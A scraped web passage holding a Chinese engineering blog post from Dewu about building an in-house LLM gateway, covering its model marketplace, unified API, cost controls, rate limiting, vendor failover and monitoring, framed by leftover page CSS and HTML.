100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、导语</h2>
<p>在人工智能技术快速演进的时代，大型语言模型和AI智能体已成为各类应用的核心组件，引发AI相关API流量的指数级增长。而大模型网关，正是这场变革中应运而生的智能交通枢纽。</p>
<p>随着DeepSeek、Qwen等开源模型及各类商用大模型的普及，企业AI应用场景日益丰富，从智能客服自动化到代码生成与软件开发，从金融法律分析到内容生成引擎，AI正深度融入企业核心业务流程。</p>
<p>这种深度融合使得企业不仅使用SaaS化的LLM服务，更在私有化环境中微调、部署LLM模型，形成混合云架构，随之带来了多LLM适配管理、成本失控、数据安全和可靠性保障等系列挑战。</p>
<h2 data-id="heading-1">二、大模型网关：AI流量的智能调度中心</h2>
<p>大模型网关是为AI工作负载专门设计的网关解决方案。它作为连接业务与AI基础设施的统一端点，为应用程序和模型之间的AI流量提供全面的管控能力。</p>
<p>与传统API网关不同，大模型网关针对AI请求的特有模式进行了专门优化。传统API网关专注于通用数据流量，基于RESTful API和静态请求响应设计，而大模型网关则专门应对AI工作负载的特殊需求，比如，长时与流式响应、复杂输入输出、高资源消耗与批处理、上下文与状态管理、专属监控与计量、关注成本与业务效果，等等。</p>
<p>大模型网关的核心能力主要体现在几个维度：模型市场、模型体验、模型调度、模型成本和稳定性（可观测性、容量管理、模型流控、服务告警）。</p>
<p>其中稳定性是大模型网关的“压舱石”，确保服务高可用、可管理、可追溯。容量管理可根据业务流量预估预先配置好足够的模型TPM额度，避免突发流量导致服务不可用或影响别的业务使用。模型观测提供实时监控每个模型健康状态、响应延迟、成功率等关键指标。模型流控可做到Key和模型粒度的TPM、QPS流量控制，一旦业务请求突破限流阈值，将依据流控规则进行限流。服务告警能力目标是借助Flink实时计算能力提供用户分钟级别的模型服务异常实时告警能力。</p>
<h2 data-id="heading-2">三、自建缘由：得物AI部署的四大挑战</h2>
<p>随着AI在得物的应用场景不断深入，其帮助公司提升效率和降低成本的潜力被广泛挖掘。然而，我们在这一过程中面临一系列严峻挑战。</p>
<h3 data-id="heading-3">避免资源浪费并提升效率</h3>
<p>在实际场景中，得物需要同时使用很多个AI模型，包括开源模型、商用模型及自建模型，这些模型的API接口、数据格式和调用方式各异。</p>
<p>如果每个业务域单独建设接入能力，会导致技术栈碎片化和重复开发，形成一个个“烟囱”，造成公司资源浪费。另外，如果每个开发团队都需要直接与各种AI模型的API对接，开发者必须学习每个AI API和AI平台，实现供应商特定的代码，会显著降低开发效率。</p>
<h3 data-id="heading-4">保障内外部模型成本可控</h3>
<p>据估算，得物12月份调用大模型的Token消耗量已达数千亿规模，是1月份用量的20.63倍，仅Token调用单月成本就是一笔相当大的金额。若业务各自直接对接公有云模型服务，可能导致模型使用和成本失控。因此，必须依托大模型流量统一入口建设一套完整的成本管控体系。</p>
<h3 data-id="heading-5">保障接入外部模型数据安全</h3>
<p>将敏感信息传输到外部LLM提供商引发了关于数据隐私、法规合规性（如PIPL和GDPR）以及潜在数据泄露的担忧。为了保障数据安全，我们考虑自建。</p>
<h3 data-id="heading-6">保障模型服务运行稳定可靠</h3>
<p>模型网关需解决以下核心稳定性问题：</p>
<ul>
<li>延迟与成功率波动：模型服务受底层算力限制，普遍存在低限流阈值，且响应延迟与调用成功率波动显著大于传统API。</li>
<li>基于Key的容量管理：模型服务通常设置固定限流阈值，易导致不同业务场景间流量相互挤占，影响全局可用性。</li>
<li>实时告警与可观测性：需在服务异常或触发限流时第一时间告警，同时完整记录请求日志（含Prompt及来源IP），便于问题追踪。</li>
<li>基于Token的精准限流：应建立以Token数量（而非调用次数）为基准的配额管理机制，从根源防止资源滥用，保障业务平稳运行。</li>
</ul>
<h2 data-id="heading-7">四、行业实践：大模型网关的多元解决方案</h2>
<p>大模型网关作为大模型应用的关键中间层，近年来随着企业级AI应用部署的加速而快速发展，以实现AI能力的统一、高效、可控管理。</p>
<p>目前市场上有多种大模型网关解决方案，它们在商业模式和核心能力上都各有特色。这里笔者将各类网关产品进行了梳理与汇总，以便读者大致了解行业现状。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/718ac135c5f24891bf254c8d896d3d7d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704322&amp;x-signature=K8%2FHNjtG8Uw0zrA1n8YYKdcx7zA%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p align="center">AI网关主要参与者及产品</p>
<h2 data-id="heading-8">五、实施策略：构建企业大模型网关的六步法</h2>
<p>对比行业落地大模型网关的案例，针对得物实际业务情况，在内部落地大模型网关时，我们制定了六个方面的策略。</p>
<h3 data-id="heading-9">打造信息丰富的模型市场</h3>
<p>随着大模型在得物内的广泛深入应用，从B/C端创新到后端效能提升，场景愈发丰富复杂。加之自研/自部署（如 Qwen、DeepSeek）与内外厂商模型层出不穷，模型供给呈现分散与混乱，业务选型门槛抬高，往往从调研、验证到上线需耗时1~2天，极大增加了业务接入AI的难度。</p>
<p>为此，网关对接入模型进行统一梳理，打造信息完备的“模型市场”。本质上是一个“AI 模型应用商店”，将分散混乱、高门槛的选型流程，重构为集中、透明、可量化评估的标准化路径。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/712479495a5141628d0d3a359027c174~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704322&amp;x-signature=d5QPcxxiBBhwYZja8YFQFWZ0nIM%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p align="center">大模型市场</p>
<p>通过统一模型市场，网关构建覆盖发现、评测、验证与集成的完整闭环：</p>
<ul>
<li>模型纳管：集中管理来自自研与内外部厂商的多样化模型，形成内部“模型货架”，消除信息碎片；原生支持托管与上云对接。</li>
<li>评测对比：支持文本生成、图像理解/生成等对比测试，可将真实业务问题一键投递给多模型直观比拼，显著降低试用门槛。</li>
<li>一站式接入：选定模型后即可查看 API 接入指南，完成“选型-试用-接入”的闭环，大幅提升对接效率。</li>
<li>运营与推荐：提供模型推荐能力，按效果与性价比打标、置顶，缩短选型时间并助力降本。</li>
</ul>
<p>通过建设模型市场，实现了模型接入的统一化与标准化，模型上架和接入效率显著提升。<strong>模型上架时间从1~2天降低到 10 分钟内，试用从 1 天降低到 5 分钟以内。</strong></p>
<h3 data-id="heading-10">统一各业务模型服务入口</h3>
<p>通过建设OpenAI like风格的统一访问API和模型服务调度能力，网关将绝大部分AI模型服务的访问集中到单一入口，使不同业务线无需关注后端模型的具体实现细节，也能实现不同厂商模型服务之间的容灾。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c2aaa017b31c47bbb7a5d05aa4aa5c9f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704322&amp;x-signature=uBNyjZ7QgxhFMDsyEC%2BT0BXS%2Fkw%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/46352cca9e0b4f23933ba1ba58c7130b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704322&amp;x-signature=t5ei8Jbu29LfFXrk3z13jlxSljs%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p align="center">模型调度策略与OpenAI like风格API</p>
<h3 data-id="heading-11">建设全流程成本管控体系</h3>
<p>在成本治理和优化上，围绕“源头管控、成本感知、模型调度、厂商折扣和成本监控”等方面着手闭环能力搭建。打通了从预算申请、模型选型、接入调用，到运行观测、成本结算的全链路，实现了精准的成本治理与优化。</p>
<p>具体表现为，在3、4季度token用量分别较前一季度增长2.52倍和2.16倍的情况下，每百万Token的成本分别降低50%+和45%+，降本额度也相当可观，达到数百万元，在保证业务体验的前提下有效压降了模型使用成本。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e024221ae7284fc1bcdf04f1b97ee8a4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704322&amp;x-signature=xs7Jdtk39nG6s0GxwFSLXl9p4ss%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p align="center">总体降本思路&amp;策略</p>
<p>目前正在搭建精细化降本能力，其核心思路是：通过构建Key/模型/厂商/项目维度的成本大盘、构建各外部厂商各类别模型均价大盘（发现更有性价比的模型）、建设用量和成本每周主动推送机制、完善成本预警/告警体系等措施，促使业务依据成本和价格数据主动进行成本治理。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/df77e202aad547928d170a18444694b8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704322&amp;x-signature=CkkxZLmOVbuESvidWE8GpRN7C%2B4%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p align="center">全流程降本能力体系</p>
<h3 data-id="heading-12">持续夯实稳定性架构能力</h3>
<p>在架构能力建设上，围绕“高可用、可控成本、稳定体验”三大目标，重点建设了限流、调度和容灾三类核心架构能力，<strong>可实现分钟级容灾切换，为大规模、多模型、多业务场景下的稳定运行提供基础保障。</strong></p>
<ul>
<li>容量管理与限流</li>
</ul>
<p>通过建设模型容量的配置化管理机制，实现按Key/项目等维度的TPM容量管理体系；若业务流量（token）超过阈值，便触发限流及容量告警。</p>
<ul>
<li>模型调度与容灾</li>
</ul>
<p>模型调度能力可帮助我们实现厂商间模型粒度的分钟级容灾。具体做法是：若检测到当前API Key配置有模型调度策略，则模型调度器便将请求按配置规则执行调度，并将选中的模型交付给模型路由模块，由路由模块封装后将请求转发到对应厂商的模型服务实现。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/25d6f3425fef4d3594c8f6ebeb99ddf7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704322&amp;x-signature=PrMA4gmjf9aaVJUDPIG4iNSa9QE%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p align="center">模型调度与路由</p>
<h3 data-id="heading-13">建设分钟级实时观测能力</h3>
<p>在AI规模化应用时代，没有分钟级观测体系的模型网关，就像没有仪表盘和刹车的F1赛车——速度越快，风险越大，毁灭性越强。因此，<strong>必须建设完善的模型调用/用量/成本的分钟级观测（监控+告警）体系。</strong></p>
<ul>
<li>模型调用/用量/性能观测。目前已实现Key和模型粒度的模型调用、token用量的监控大盘，如下图所示：</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6f608d5546dd460491aec848a8183cfd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704322&amp;x-signature=OovANBkw%2FrAxcOI1U1FMnkjgRpI%3D" alt="" loading="lazy"/>调用/用量监控分时（基于Key）<a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2b34d44c641143f995ab93633447bae6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704322&amp;x-signature=67yi06G4uhuSGCTjHMzzh2Ef9fk%3D" alt="" loading="lazy"/>调用失败率和平均RT（基于Key）<a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3d4c2e36231148dbb9e749316f14b762~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704322&amp;x-signature=3Wb37wBHW%2FlxSbWxuzj7%2Fh5no3A%3D" alt="" loading="lazy"/>RPM/TPM监控分时（基于Key）<a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/385fdaaa94ea464eb36dfb8ecbe93e1a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704322&amp;x-signature=R3JGg7OOR5%2F3ah4uXHdEFfmpXcg%3D" alt="" loading="lazy"/>端到端平均RT监控分时（基于Key）<a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c2df772dd4ea45d8be51b8a12662aba3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704322&amp;x-signature=xkOPAbNvvuhz4P54AxxPaIoMAxA%3D" alt="" loading="lazy"/>用量监控分时（基于模型）<a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/18afbad886d047a58aec8c8c7cd4890b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704322&amp;x-signature=stdG8wPPI10YrPLDMC8xBOvjYCM%3D" alt="" loading="lazy"/>性能监控分时（基于模型）<a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<ul>
<li>模型成本观测。模型成本观测方面，正在实现模型、Key、厂商、项目等粒度的实时监控大盘，以及日/周/月/指定时间维度汇总的成本数据大盘。</li>
</ul>

<ul>
<li>模型异常告警。模型服务告警方面，当前正在基于Flink实施计算和Kafka事件订阅机制建设一套基于模型和Key的实时告警体系，让业务对自己的模型调用异常能在3分钟以内通过飞书告警感知。</li>
</ul>
<h3 data-id="heading-14">建设Key生命周期管理能力</h3>
<p>通过API Key管理产品化能力建设，实现了API Key申请工单及自动分发、Key场景/负责人/共享人/状态管理和黑名单功能，并依托API Key实现接口鉴权、预算管理（预算分配/预算消耗/预算预警）、容量管理、模型调度等核心功能及关键流程节点的规范化管理。</p>
<h2 data-id="heading-15">六、创新亮点：大模型网关的核心技术突破</h2>
<p>模型网关瞄准“效率-成本-稳定性-安全&amp;合规”着力平台建设，并继续在成本管控、模型接入效率、服务稳定性、模型监控/告警等方面持续创新：</p>
<ul>
<li><strong>构建全流程成本管控体系。</strong> 通过预算与 API Key 申请自动化、用量监控、成本展示、超额预警与告警、智能调度、用量与成本大盘等能力，形成“预算申请—调用监控—预算预警—模型调度—费用查看”的闭环管控。</li>
</ul>

<ul>
<li><strong>实现跨厂商的模型级容灾。</strong> 通过在网关配置显式或默认的调度策略，将请求优先分配至性价比更高的模型，既实现不同厂商间的模型级容灾，也成为降本利器。</li>
</ul>

<ul>
<li><strong>实现厂商无感的接入体验。</strong> 网关统一分发 API Key 并提供统一的模型服务 API，业务无需关心各厂商的入参/出参差异，即可获得一致的接入体验并显著提升效率。</li>
</ul>

<ul>
<li><strong>便捷高效的模型选型体验。</strong> 依托模型市场、试用预算池、试用与效果对比、推荐板块等功能，在控成本前提下为用户提供快捷选型路径，助力在层出不穷的模型中快速锁定理想方案。</li>
</ul>

<ul>
<li><strong>分钟级用量与成本观测。</strong> 已构建近实时（分钟级）运行监控，覆盖调用量、失败次数/率、RT、TPM、RPM等关键指标；并在开发基于 Key 与模型粒度的成本实时观测与离线报表，支持按周将成本汇总推送给调用方。</li>
</ul>
<h2 data-id="heading-16">七、应用收益：从成本节约到效能提升</h2>
<p>得物部署大模型网关后，经过「模型网关升级」项目建设，取得如下效果：</p>
<p><strong>(1) 网关平台从0~1搭建起来。</strong> 模型网关从单一的纯后台服务进化为面向管理员和研发/产品/运营用户的平台化产品；不再只是模型访问的“管道”，而是集模型集市、模型调度、成本治理、创新实验于一体的支撑整个组织进行AI创新的入口平台。</p>
<p><strong>(2) 内外部模型100%纳管。</strong> 从0~1建成对接得物（KubeAI）百度/阿里/字节/华为/微软/谷歌模型服务的模型集市，完成内外部模型100%纳管，新模型上架/接入只需在平台一键配置，无需新写实现逻辑。</p>
<p><strong>(3) 模型接入效率提升97%。</strong> 管理各云商和自建模型140个，单模型平均上架时间从1~2天降低到 10 分钟内，接入效率提升97+%；模型试用与效果评估过程从 1 天降低到 5 分钟以内，效率提升98%+。</p>
<p><strong>(4) H2节省成本数百万元。</strong> 依托模型调度切换能力和统一API建设，以及降本方法论推广，Q3、Q4在用量均较前一季度翻倍的情况下，实现每百万token成本连续分别降低51.52%和48.37%。两季共实现降本额度达数百万元，并且随着用量增加降本收益将越来越明显。</p>
<h2 data-id="heading-17">八、未来展望：从大模型网关向AI网关演进</h2>
<p>大模型网关的未来发展将向如下几个方向演进：</p>
<p>首先，模型网关继续承担大模型成本管控主体责任，继续通过强化数据分析能力推进精细化降本，落地Qwen系列自建模型通过云商托管方式降本。</p>
<p>其次，围绕标准化与生态兼容，网关将引入并适配 MCP（模型上下文协议）；实现API同时兼容多厂商与多形态模型（文本、图像、语音、视频与多模态），在保持一致体验的前提下实现跨生态的无缝互通与扩展。</p>
<p>另外，API网关正从单纯的流量管理工具转变为AI编排平台，将在已有的模型调度能力基础上建设更强大的工作流与多模型协同机制，能根据成本、延迟、准确性，将请求分配给最优AI模型。</p>
<p>最终，模型网关将不再是一个“网关”，而是企业智能化的“神经中枢”——它不直接思考，但确保思考过程高效、安全、经济地发生。</p>
<p>结语：</p>
<p>未来的技术方向已经清晰——大模型网关不是API网关的替代品，而是其演进形态。随着AI逐步嵌入各类应用，企业选择可扩展的大模型网关平台，将避免被孤立在特定AI生态中，获得技术架构的长期竞争优势。</p>
<h3 data-id="heading-18">往期回顾</h3>
<p>1.从“人治”到“机治”：得物离线数仓发布流水线质量门禁实践</p>
<p>2.AI编程实践：从Claude Code实践到团队协作的优化思考｜得物技术</p>
<p>3.入选AAAI-PerFM｜得物社区推荐之基于大语言模型的新颖性推荐算法</p>
<p>4.Galaxy比数平台功能介绍及实现原理｜得物技术</p>
<p>5.得物App智能巡检技术的探索与实践</p>
<h3 data-id="heading-19">文 /禹极</h3>
<p>关注得物技术，每周更新技术干货</p>
<p>要是觉得文章对你有帮助的话，欢迎评论转发点赞～</p>
<p>未经得物技术许可严禁转载，否则依法追究法律责任。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vibe Coding 概念大全]]></title>    <link>https://juejin.cn/post/7602191709389176874</link>    <guid>https://juejin.cn/post/7602191709389176874</guid>    <pubDate>2026-02-03T06:28:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602191709389176874" data-draft-id="7602211941513183286" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vibe Coding 概念大全"/> <meta itemprop="keywords" content="AI编程"/> <meta itemprop="datePublished" content="2026-02-03T06:28:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="金金金__"/> <meta itemprop="url" content="https://juejin.cn/user/1979586945487064"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vibe Coding 概念大全
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1979586945487064/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    金金金__
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T06:28:39.000Z" title="Tue Feb 03 2026 06:28:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读31分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body 